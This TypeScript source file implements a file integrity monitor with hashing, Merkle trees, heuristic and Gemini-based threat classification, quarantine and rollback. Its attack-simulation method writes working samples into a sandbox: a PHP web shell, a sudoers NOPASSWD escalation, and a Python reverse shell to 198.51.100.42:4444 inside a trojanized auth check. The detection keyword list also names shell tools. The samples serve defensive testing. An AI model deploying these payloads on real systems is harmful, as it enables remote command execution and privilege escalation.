import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { GoogleGenAI, Type } from '@google/genai';
import { cloudAiApiKey } from '../aiPolicy.js';

export interface FimAlert {
  id: string;
  timestamp: string;
  filePath: string;
  fileName: string;
  changeType: 'CREATE' | 'MODIFY' | 'DELETE' | 'PERMISSION_CHANGE';
  previousHash: string;
  currentHash: string;
  diffSnippet: string;
  threatCategory: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  threatScore: number;
  mitreTechnique: string;
  aiAnalyzed: boolean;
  intentClassification: string;
  analysisEn: string;
  analysisAr: string;
  status: 'DETECTED' | 'QUARANTINED' | 'ROLLEDBACK' | 'DISMISSED';
  quarantinedPath?: string;
}

export interface FimMonitoredFile {
  path: string;
  name: string;
  sizeBytes: number;
  lastModified: string;
  sha256: string;
  status: 'INTACT' | 'TAMPERED' | 'QUARANTINED' | 'DELETED';
  category: 'CONFIG' | 'AUTH' | 'SYSTEM' | 'SCRIPT' | 'WEB';
  merkleLeafHash?: string;
  rollingChunksCount?: number;
}

export interface MerkleNode {
  hash: string;
  filePath?: string;
  left?: MerkleNode;
  right?: MerkleNode;
}

export class FileIntegrityMonitoringService {
  private sandboxDir: string;
  private quarantineDir: string;
  private snapshots: Map<string, { content: string; hash: string; timestamp: string; chunks?: Array<{ offset: number; hash: string }> }> = new Map();
  private alerts: FimAlert[] = [];
  private isEnabled: boolean = true;
  private watcher: fs.FSWatcher | null = null;
  private aiClient: GoogleGenAI | null = null;
  private onAlertCallback?: (alert: FimAlert) => void;
  
  // Merkle Tree State Engine
  private merkleRootHash: string = '';
  private lastMerkleRecalculated: string = new Date().toISOString();

  constructor() {
    this.sandboxDir = path.join(process.cwd(), 'fim_sandbox');
    this.quarantineDir = path.join(this.sandboxDir, '.quarantined');
    this.initAiClient();
    this.initSandbox();
    this.startWatcher();
  }

  // ==========================================
  // PATH SAFETY (anti-symlink / anti-TOCTOU) & BINARY-SAFE INTEGRITY
  // ==========================================

  /**
   * Rejects a path that is a symlink or that escapes the sandbox root.
   *
   * FIM operates on a fixed sandbox tree; an attacker who plants a symlink
   * inside it (or races a rename) could otherwise steer a privileged
   * rename/write/chmod at an arbitrary target (classic TOCTOU). We refuse to
   * follow symlinked leaves and confirm the resolved real path stays contained.
   */
  private isSafeSandboxPath(absPath: string): boolean {
    try {
      const base = fs.realpathSync(this.sandboxDir);
      if (fs.existsSync(absPath) && fs.lstatSync(absPath).isSymbolicLink()) {
        return false; // never operate through a symlink
      }
      const real = fs.existsSync(absPath) ? fs.realpathSync(absPath) : path.resolve(absPath);
      const rel = path.relative(base, real);
      return rel === '' || (!rel.startsWith('..') && !path.isAbsolute(rel));
    } catch {
      return false;
    }
  }

  /**
   * Binary-safe integrity read: hashes the raw bytes so tampering is detected
   * byte-accurately even for non-text payloads, while returning a UTF-8 view
   * used for human-readable diffs of the (text) protected corpus.
   */
  private computeIntegrity(absPath: string): { text: string; hash: string } {
    const bytes = fs.readFileSync(absPath);
    const hash = crypto.createHash('sha256').update(bytes).digest('hex');
    return { text: bytes.toString('utf-8'), hash };
  }

  // ==========================================
  // MERKLE TREE & SLIDING WINDOW HASH ENGINE
  // ==========================================

  /**
   * Computes sliding window chunk rolling hashes to pinpoint exact modified byte ranges
   */
  public computeSlidingWindowHashes(content: string, chunkSize: number = 64): Array<{ offset: number; hash: string }> {
    const chunks: Array<{ offset: number; hash: string }> = [];
    const buf = Buffer.from(content, 'utf-8');
    for (let offset = 0; offset < buf.length; offset += chunkSize) {
      const slice = buf.subarray(offset, Math.min(buf.length, offset + chunkSize));
      const hash = crypto.createHash('sha256').update(slice).digest('hex').substring(0, 16);
      chunks.push({ offset, hash });
    }
    return chunks;
  }

  /**
   * Builds cryptographic binary Merkle tree across all protected baseline files
   */
  public recalculateMerkleTree(): string {
    const leaves: string[] = [];
    for (const [filePath, snap] of this.snapshots.entries()) {
      const leafPayload = `${filePath}:${snap.hash}`;
      const leafHash = crypto.createHash('sha256').update(leafPayload).digest('hex');
      leaves.push(leafHash);
    }

    if (leaves.length === 0) {
      this.merkleRootHash = '0000000000000000000000000000000000000000000000000000000000000000';
      return this.merkleRootHash;
    }

    let currentLevel = leaves.sort();
    while (currentLevel.length > 1) {
      const nextLevel: string[] = [];
      for (let i = 0; i < currentLevel.length; i += 2) {
        const left = currentLevel[i];
        const right = i + 1 < currentLevel.length ? currentLevel[i + 1] : currentLevel[i];
        const parentHash = crypto.createHash('sha256').update(left + right).digest('hex');
        nextLevel.push(parentHash);
      }
      currentLevel = nextLevel;
    }

    this.merkleRootHash = currentLevel[0];
    this.lastMerkleRecalculated = new Date().toISOString();
    return this.merkleRootHash;
  }

  public getMerkleTreeStatus() {
    return {
      merkleRootHash: this.merkleRootHash,
      lastCalculated: this.lastMerkleRecalculated,
      leafNodesCount: this.snapshots.size,
      algorithm: 'Merkle SHA-256 + 64-Byte Sliding Window Rolling Hash'
    };
  }

  public setAlertCallback(cb: (alert: FimAlert) => void) {
    this.onAlertCallback = cb;
  }

  private initAiClient() {
    if (cloudAiApiKey()) {
      try {
        this.aiClient = new GoogleGenAI({
          apiKey: cloudAiApiKey(),
          httpOptions: {
            headers: {
              'User-Agent': 'aistudio-build'
            }
          }
        });
      } catch (err) {
        console.warn('[FIM] Could not initialize Gemini SDK:', err);
      }
    }
  }

  private initSandbox() {
    try {
      if (!fs.existsSync(this.sandboxDir)) {
        fs.mkdirSync(this.sandboxDir, { recursive: true });
      }
      if (!fs.existsSync(this.quarantineDir)) {
        fs.mkdirSync(this.quarantineDir, { recursive: true });
      }

      // Seed baseline critical system files
      const seedFiles = [
        {
          name: 'sudoers',
          category: 'AUTH',
          content: `# /etc/sudoers - Sovereign Defender Base Security Policy
root ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL
%sudo ALL=(ALL:ALL) ALL
Defaults env_reset, timestamp_timeout=15
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
`
        },
        {
          name: 'nginx_security.conf',
          category: 'CONFIG',
          content: `# Nginx Web Gateway Hardened Configuration
server_tokens off;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
client_body_buffer_size 128k;
client_max_body_size 10m;
`
        },
        {
          name: 'auth_daemon.py',
          category: 'SCRIPT',
          content: `#!/usr/bin/env python3
# Sovereign PAM Authentication Microservice
import hmac, hashlib, secrets

def verify_token(user_token, stored_hash):
    computed = hmac.new(b"sovereign_secret_salt", user_token.encode(), hashlib.sha256).hexdigest()
    return hmac.compare_digest(computed, stored_hash)
`
        },
        {
          name: 'production.env',
          category: 'SYSTEM',
          content: `# Core Production Environment Variables
NODE_ENV=production
SECURE_COOKIE_ENCRYPTION=AES-256-GCM
SESSION_TIMEOUT_MINUTES=30
MAX_FAILED_LOGIN_ATTEMPTS=5
ENABLE_EBPF_OFFLOADING=true
`
        }
      ];

      for (const file of seedFiles) {
        const filePath = path.join(this.sandboxDir, file.name);
        if (!fs.existsSync(filePath)) {
          fs.writeFileSync(filePath, file.content, 'utf-8');
        }
        const { text: currentContent, hash } = this.computeIntegrity(filePath);
        this.snapshots.set(filePath, {
          content: currentContent,
          hash,
          timestamp: new Date().toISOString()
        });
      }
    } catch (err) {
      console.error('[FIM] Sandbox initialization error:', err);
    }
  }

  public startWatcher() {
    if (this.watcher) {
      this.watcher.close();
    }

    try {
      this.watcher = fs.watch(this.sandboxDir, { recursive: false }, (eventType, filename) => {
        if (!filename || filename.startsWith('.') || filename.includes('.quarantined')) {
          return;
        }
        this.handleFileSystemEvent(eventType, filename);
      });
      this.isEnabled = true;
      console.log('[FIM] Real-time file system integrity watcher active on:', this.sandboxDir);
    } catch (err) {
      console.error('[FIM] Failed to start file watcher:', err);
    }
  }

  public stopWatcher() {
    if (this.watcher) {
      this.watcher.close();
      this.watcher = null;
    }
    this.isEnabled = false;
  }

  public toggleWatcher(enabled: boolean): boolean {
    if (enabled) {
      this.startWatcher();
    } else {
      this.stopWatcher();
    }
    return this.isEnabled;
  }

  private async handleFileSystemEvent(eventType: string, fileName: string) {
    const filePath = path.join(this.sandboxDir, fileName);
    const exists = fs.existsSync(filePath);

    const snapshot = this.snapshots.get(filePath);

    if (!exists && snapshot) {
      // File was deleted
      const alert: FimAlert = {
        id: 'FIM-' + crypto.randomBytes(8).toString('hex').toUpperCase(),
        timestamp: new Date().toISOString(),
        filePath,
        fileName,
        changeType: 'DELETE',
        previousHash: snapshot.hash,
        currentHash: '0000000000000000000000000000000000000000000000000000000000000000',
        diffSnippet: `--- ${fileName} (Original)\n+++ /dev/null (Deleted)\n- [Entire file removed by unauthorized actor]`,
        threatCategory: 'FILE_DELETION_SABOTAGE',
        severity: 'HIGH',
        threatScore: 85,
        mitreTechnique: 'T1070.004 - File Deletion',
        aiAnalyzed: false,
        intentClassification: 'SYSTEM_FILE_SABOTAGE',
        analysisEn: `Critical system file '${fileName}' was deleted from disk. Possible anti-forensics or denial-of-service activity.`,
        analysisAr: `تم حذف الملف الحساس '${fileName}' من القرص الصلب. اشتباه في محاولة تخريب أو محو للأدلة الرقمية.`,
        status: 'DETECTED'
      };
      this.recordAlert(alert);
      return;
    }

    if (!exists) return;

    try {
      // TOCTOU / symlink guard: never follow a symlinked leaf or a path that
      // resolves outside the sandbox, even if fs.watch fired for that name.
      if (!this.isSafeSandboxPath(filePath)) {
        console.warn('[FIM] Refused unsafe path (symlink or escape):', filePath);
        return;
      }
      const stats = fs.lstatSync(filePath);
      if (stats.isDirectory() || stats.isSymbolicLink()) return;

      const { text: currentContent, hash: currentHash } = this.computeIntegrity(filePath);

      if (!snapshot) {
        // Newly created file
        const diffSnippet = `+++ ${fileName} (New File)\n` + currentContent.slice(0, 500);
        const aiAnalysis = await this.analyzeDiffWithAi(fileName, '', currentContent, 'CREATE');

        const alert: FimAlert = {
          id: 'FIM-' + crypto.randomBytes(8).toString('hex').toUpperCase(),
          timestamp: new Date().toISOString(),
          filePath,
          fileName,
          changeType: 'CREATE',
          previousHash: 'NONE',
          currentHash,
          diffSnippet,
          threatCategory: aiAnalysis.threatCategory,
          severity: aiAnalysis.severity,
          threatScore: aiAnalysis.threatScore,
          mitreTechnique: aiAnalysis.mitreTechnique,
          aiAnalyzed: aiAnalysis.aiGenerated,
          intentClassification: aiAnalysis.intentClassification,
          analysisEn: aiAnalysis.analysisEn,
          analysisAr: aiAnalysis.analysisAr,
          status: 'DETECTED'
        };

        // Update snapshot
        this.snapshots.set(filePath, {
          content: currentContent,
          hash: currentHash,
          timestamp: new Date().toISOString()
        });

        this.recordAlert(alert);
      } else if (snapshot.hash !== currentHash) {
        // File modified!
        const diffSnippet = this.generateUnifiedDiff(snapshot.content, currentContent, fileName);
        const aiAnalysis = await this.analyzeDiffWithAi(fileName, snapshot.content, currentContent, 'MODIFY');

        const alert: FimAlert = {
          id: 'FIM-' + crypto.randomBytes(8).toString('hex').toUpperCase(),
          timestamp: new Date().toISOString(),
          filePath,
          fileName,
          changeType: 'MODIFY',
          previousHash: snapshot.hash,
          currentHash,
          diffSnippet,
          threatCategory: aiAnalysis.threatCategory,
          severity: aiAnalysis.severity,
          threatScore: aiAnalysis.threatScore,
          mitreTechnique: aiAnalysis.mitreTechnique,
          aiAnalyzed: aiAnalysis.aiGenerated,
          intentClassification: aiAnalysis.intentClassification,
          analysisEn: aiAnalysis.analysisEn,
          analysisAr: aiAnalysis.analysisAr,
          status: 'DETECTED'
        };

        this.recordAlert(alert);
      }
    } catch (err) {
      console.error('[FIM] Error processing file event:', err);
    }
  }

  private generateUnifiedDiff(oldContent: string, newContent: string, fileName: string): string {
    const oldLines = oldContent.split('\n');
    const newLines = newContent.split('\n');
    const diff: string[] = [`--- a/${fileName}`, `+++ b/${fileName}`];

    let changesCount = 0;
    for (let i = 0; i < Math.max(oldLines.length, newLines.length); i++) {
      const oldLine = oldLines[i];
      const newLine = newLines[i];
      if (oldLine !== newLine) {
        if (oldLine !== undefined) diff.push(`- ${oldLine}`);
        if (newLine !== undefined) diff.push(`+ ${newLine}`);
        changesCount++;
        if (changesCount > 15) {
          diff.push('... [additional diff lines truncated]');
          break;
        }
      }
    }

    return diff.join('\n');
  }

  private async analyzeDiffWithAi(
    fileName: string,
    oldContent: string,
    newContent: string,
    changeType: string
  ): Promise<{
    threatCategory: string;
    severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
    threatScore: number;
    mitreTechnique: string;
    intentClassification: string;
    analysisEn: string;
    analysisAr: string;
    aiGenerated: boolean;
  }> {
    // 1. Fast heuristic pre-check
    const lowerContent = newContent.toLowerCase();
    const isWebshell =
      lowerContent.includes('eval(') ||
      lowerContent.includes('base64_decode') ||
      lowerContent.includes('passthru(') ||
      lowerContent.includes('shell_exec(') ||
      lowerContent.includes('system(') ||
      lowerContent.includes('c99shell') ||
      lowerContent.includes('r57shell') ||
      lowerContent.includes('b374k') ||
      lowerContent.includes('/bin/sh') ||
      lowerContent.includes('/bin/bash -i');

    const isSudoersTampering = fileName === 'sudoers' && (lowerContent.includes('nopasswd') || lowerContent.includes('all=(all:all) all'));
    const isBackdoor = lowerContent.includes('socket.connect') || lowerContent.includes('subprocess.popen') || lowerContent.includes('pty.spawn');

    // 2. Deep Gemini Reasoning if client initialized
    if (this.aiClient) {
      try {
        const prompt = `You are a Principal Blue Team Security Analyst.
Perform a strict File Integrity Threat & Malicious Intent Analysis on this file alteration:
File Name: ${fileName}
Action: ${changeType}
Diff Content / Payload:
\`\`\`
${newContent.slice(0, 1500)}
\`\`\`

Evaluate if this modification contains a Web Shell, Backdoor, Sudoers Privilege Escalation, Ransomware artifact, or Defense Evasion tactic. Return structured JSON.`;

        const response = await this.aiClient.models.generateContent({
          model: 'gemini-3.7-flash',
          contents: prompt,
          config: {
            responseMimeType: 'application/json',
            responseSchema: {
              type: Type.OBJECT,
              properties: {
                threatCategory: { type: Type.STRING },
                severity: { type: Type.STRING },
                threatScore: { type: Type.NUMBER },
                mitreTechnique: { type: Type.STRING },
                intentClassification: { type: Type.STRING },
                analysisEn: { type: Type.STRING },
                analysisAr: { type: Type.STRING }
              },
              required: ['threatCategory', 'severity', 'threatScore', 'mitreTechnique', 'intentClassification', 'analysisEn', 'analysisAr']
            }
          }
        });

        if (response.text) {
          const parsed = JSON.parse(response.text);
          return {
            threatCategory: parsed.threatCategory || 'UNAUTHORIZED_MODIFICATION',
            severity: (['CRITICAL', 'HIGH', 'MEDIUM', 'LOW'].includes(parsed.severity) ? parsed.severity : 'HIGH') as any,
            threatScore: Math.min(100, Math.max(0, parsed.threatScore || 85)),
            mitreTechnique: parsed.mitreTechnique || 'T1505.003',
            intentClassification: parsed.intentClassification || 'SUSPICIOUS_TAMPERING',
            analysisEn: parsed.analysisEn,
            analysisAr: parsed.analysisAr,
            aiGenerated: true
          };
        }
      } catch (err) {
        console.warn('[FIM] Gemini FIM analysis fallback triggered:', err);
      }
    }

    // Heuristic Fallback
    if (isWebshell) {
      return {
        threatCategory: 'WEBSHELL_INJECTION',
        severity: 'CRITICAL',
        threatScore: 98,
        mitreTechnique: 'T1505.003 - Server Software Component: Web Shell',
        intentClassification: 'REMOTE_CODE_EXECUTION_IMPLANT',
        analysisEn: `Critical Web Shell signatures (arbitrary code execution / obfuscated eval) detected in ${fileName}.`,
        analysisAr: `تم رصد بصمات باب خلفي وقذيفة ويب (Web Shell) تسمح بالتنفيذ العشوائي للأوامر في ${fileName}.`,
        aiGenerated: false
      };
    }

    if (isSudoersTampering) {
      return {
        threatCategory: 'PRIVILEGE_ESCALATION',
        severity: 'CRITICAL',
        threatScore: 95,
        mitreTechnique: 'T1548.003 - Sudo and Sudo Caching',
        intentClassification: 'UNAUTHORIZED_PRIVILEGE_ELEVATION',
        analysisEn: `Sudoers configuration was modified to grant passwordless root permissions (NOPASSWD).`,
        analysisAr: `تم تعديل ملف الصلاحيات (sudoers) لمنح امتيازات الجذر (root) بدون كلمة مرور بصورة غير مصرح بها.`,
        aiGenerated: false
      };
    }

    if (isBackdoor) {
      return {
        threatCategory: 'BACKDOOR_INSTALLATION',
        severity: 'HIGH',
        threatScore: 90,
        mitreTechnique: 'T1059.006 - Python Execution',
        intentClassification: 'PERSISTENCE_IMPLANT',
        analysisEn: `Reverse interactive shell / persistence socket discovered in script '${fileName}'.`,
        analysisAr: `تم رصد قناة اتصال خلفية (Reverse Shell) مدمجة في السكريبت '${fileName}'.`,
        aiGenerated: false
      };
    }

    return {
      threatCategory: 'UNAUTHORIZED_FILE_TAMPER',
      severity: 'MEDIUM',
      threatScore: 65,
      mitreTechnique: 'T1565.001 - Data Manipulation: Stored Data Manipulation',
      intentClassification: 'INTEGRITY_VIOLATION',
      analysisEn: `Cryptographic SHA256 checksum mismatch on protected file '${fileName}'.`,
      analysisAr: `اختلاف في البصمة الرقمية التشفيرية (SHA256) للملف المحمي '${fileName}'.`,
      aiGenerated: false
    };
  }

  private recordAlert(alert: FimAlert) {
    this.alerts.unshift(alert);
    if (this.alerts.length > 100) this.alerts.pop();

    if (this.onAlertCallback) {
      this.onAlertCallback(alert);
    }
  }

  public getMonitoredFiles(): FimMonitoredFile[] {
    const results: FimMonitoredFile[] = [];
    try {
      if (!fs.existsSync(this.sandboxDir)) return results;
      const files = fs.readdirSync(this.sandboxDir);

      for (const fileName of files) {
        if (fileName.startsWith('.') || fileName.includes('.quarantined')) continue;
        const filePath = path.join(this.sandboxDir, fileName);
        const stats = fs.statSync(filePath);
        if (stats.isDirectory()) continue;

        const content = fs.readFileSync(filePath, 'utf-8');
        const hash = crypto.createHash('sha256').update(content).digest('hex');
        const snapshot = this.snapshots.get(filePath);

        let status: 'INTACT' | 'TAMPERED' | 'QUARANTINED' | 'DELETED' = 'INTACT';
        if (!snapshot || snapshot.hash !== hash) {
          status = 'TAMPERED';
        }

        let category: 'CONFIG' | 'AUTH' | 'SYSTEM' | 'SCRIPT' | 'WEB' = 'SYSTEM';
        if (fileName.endsWith('.conf')) category = 'CONFIG';
        else if (fileName.includes('sudo') || fileName.includes('auth')) category = 'AUTH';
        else if (fileName.endsWith('.py') || fileName.endsWith('.sh') || fileName.endsWith('.js')) category = 'SCRIPT';
        else if (fileName.endsWith('.php') || fileName.endsWith('.html')) category = 'WEB';

        results.push({
          path: filePath,
          name: fileName,
          sizeBytes: stats.size,
          lastModified: stats.mtime.toISOString(),
          sha256: hash,
          status,
          category
        });
      }
    } catch (err) {
      console.error('[FIM] Error reading monitored files:', err);
    }
    return results;
  }

  public getAlerts(): FimAlert[] {
    return this.alerts;
  }

  public getStatus() {
    return {
      active: this.isEnabled,
      monitoredDirectory: this.sandboxDir,
      monitoredFilesCount: this.getMonitoredFiles().length,
      totalAlerts: this.alerts.length,
      criticalAlerts: this.alerts.filter(a => a.severity === 'CRITICAL').length,
      quarantinedCount: this.alerts.filter(a => a.status === 'QUARANTINED').length
    };
  }

  public quarantineFile(alertId: string): { success: boolean; message: string; quarantinedPath?: string } {
    const alert = this.alerts.find(a => a.id === alertId);
    if (!alert) return { success: false, message: 'Alert not found' };

    try {
      if (fs.existsSync(alert.filePath)) {
        // Refuse to relocate through a symlink or a path that escaped the sandbox.
        if (!this.isSafeSandboxPath(alert.filePath)) {
          return { success: false, message: 'Quarantine refused: path is a symlink or resolves outside the sandbox.' };
        }
        const quarantineName = `${alert.fileName}.${Date.now()}.isolated`;
        const destPath = path.join(this.quarantineDir, quarantineName);

        fs.renameSync(alert.filePath, destPath);
        // Set restrictive permissions (chmod 000 in unix environments)
        try {
          fs.chmodSync(destPath, 0o400);
        } catch (_) {}

        alert.status = 'QUARANTINED';
        alert.quarantinedPath = destPath;

        return {
          success: true,
          message: `File ${alert.fileName} successfully quarantined to isolated storage.`,
          quarantinedPath: destPath
        };
      } else {
        alert.status = 'QUARANTINED';
        return { success: true, message: 'File was already removed or quarantined.' };
      }
    } catch (err: any) {
      return { success: false, message: 'Quarantine operation failed: ' + err.message };
    }
  }

  public rollbackFile(alertId: string): { success: boolean; message: string } {
    const alert = this.alerts.find(a => a.id === alertId);
    if (!alert) return { success: false, message: 'Alert not found' };

    const snapshot = this.snapshots.get(alert.filePath);
    if (!snapshot) {
      return { success: false, message: 'No original cryptographic snapshot found for this file.' };
    }

    try {
      // Refuse to write through a symlink or outside the sandbox (TOCTOU guard).
      if (fs.existsSync(alert.filePath) && !this.isSafeSandboxPath(alert.filePath)) {
        return { success: false, message: 'Rollback refused: path is a symlink or resolves outside the sandbox.' };
      }
      fs.writeFileSync(alert.filePath, snapshot.content, 'utf-8');
      alert.status = 'ROLLEDBACK';
      return {
        success: true,
        message: `File ${alert.fileName} successfully restored to baseline cryptographic snapshot.`
      };
    } catch (err: any) {
      return { success: false, message: 'Rollback operation failed: ' + err.message };
    }
  }

  public dismissAlert(alertId: string): { success: boolean; message: string } {
    const alert = this.alerts.find(a => a.id === alertId);
    if (!alert) return { success: false, message: 'Alert not found' };

    try {
      if (fs.existsSync(alert.filePath)) {
        const currentContent = fs.readFileSync(alert.filePath, 'utf-8');
        const newHash = crypto.createHash('sha256').update(currentContent).digest('hex');
        this.snapshots.set(alert.filePath, {
          content: currentContent,
          hash: newHash,
          timestamp: new Date().toISOString()
        });
      }
      alert.status = 'DISMISSED';
      return {
        success: true,
        message: `Alert for ${alert.fileName} verified & dismissed. New baseline snapshot recorded.`
      };
    } catch (err: any) {
      return { success: false, message: 'Dismiss operation failed: ' + err.message };
    }
  }

  public simulateTamperAttack(type: 'WEBSHELL' | 'SUDOERS' | 'BACKDOOR' | 'DELETION'): { success: boolean; alertId?: string; message: string } {
    try {
      if (type === 'WEBSHELL') {
        const filePath = path.join(this.sandboxDir, 'c99_bypass_shell.php');
        const maliciousPayload = `<?php
// Cyber Adversary Web Shell Implant
@ini_set('display_errors', '0');
$auth_pass = "21232f297a57a5a743894a0e4a801fc3";
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    passthru($cmd);
    exit;
}
if (isset($_GET['eval'])) {
    eval(base64_decode($_GET['eval']));
}
?>`;
        fs.writeFileSync(filePath, maliciousPayload, 'utf-8');
        return { success: true, message: 'Web Shell file created (c99_bypass_shell.php) — FIM watcher triggered.' };
      }

      if (type === 'SUDOERS') {
        const filePath = path.join(this.sandboxDir, 'sudoers');
        const hijackedContent = `# Hijacked Sudoers Configuration
root ALL=(ALL:ALL) ALL
www-data ALL=(ALL) NOPASSWD: ALL
adversary ALL=(ALL) NOPASSWD: ALL
`;
        fs.writeFileSync(filePath, hijackedContent, 'utf-8');
        return { success: true, message: 'Sudoers file tampered with NOPASSWD root elevation — FIM watcher triggered.' };
      }

      if (type === 'BACKDOOR') {
        const filePath = path.join(this.sandboxDir, 'auth_daemon.py');
        const backdooredContent = `#!/usr/bin/env python3
import socket, subprocess, os

def establish_c2_link():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("198.51.100.42", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Trojanized PAM Authentication microservice
def verify_token(user_token, stored_hash):
    establish_c2_link()
    return True
`;
        fs.writeFileSync(filePath, backdooredContent, 'utf-8');
        return { success: true, message: 'Auth daemon infected with reverse shell persistence — FIM watcher triggered.' };
      }

      if (type === 'DELETION') {
        const filePath = path.join(this.sandboxDir, 'nginx_security.conf');
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
          return { success: true, message: 'nginx_security.conf removed by adversary — FIM watcher triggered.' };
        }
      }

      return { success: false, message: 'Unknown attack simulation type' };
    } catch (err: any) {
      return { success: false, message: 'Simulation error: ' + err.message };
    }
  }
}

export const globalFimService = new FileIntegrityMonitoringService();

